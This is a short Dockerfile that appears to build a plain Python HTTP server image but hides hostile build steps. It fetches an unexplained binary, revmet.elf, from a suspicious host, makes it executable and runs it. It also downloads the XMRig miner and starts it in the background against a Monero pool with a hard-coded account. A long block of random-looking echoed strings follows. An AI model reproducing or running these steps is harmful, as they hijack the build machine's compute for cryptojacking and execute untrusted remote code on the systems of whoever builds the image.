FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo HRUhE6UT1zjhZQpfKWAT9OJSnUhhdbbS T0bkcR7xfhRyHalnxS6HyS8omZKoXtWB 0nvrROKyqJVFZA9AhfS0Paz6GBj7nEOG AiKJxKkxM2L0p0Dnw4E9dYLnVHwmWcVS BgYwMAOpfd4tdCcizrgqhCWMp3JU5Snq 8AItPSENGw6h6iX8VlsbsUiek5oYIuCp hjyr3C6fV7FEYAnuQDqUuvgHvgO2vgwz PQRLcCGzWARgATYLdTllskolWFxiR5ln BrHlsiHjTHYQjbk8mQWN430WuKh41piP prky9fbl4BRRwHrCHltCmONRtXzfwBUW 0SHf2cwvqj3FZFUBt33sDqtJzBi48E8a seIcQkM4daWcrT5tDtYEjp2Nk3QxQvEk PDJBHKY92QbYuxgFqw20ht6y5YRAidDB DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]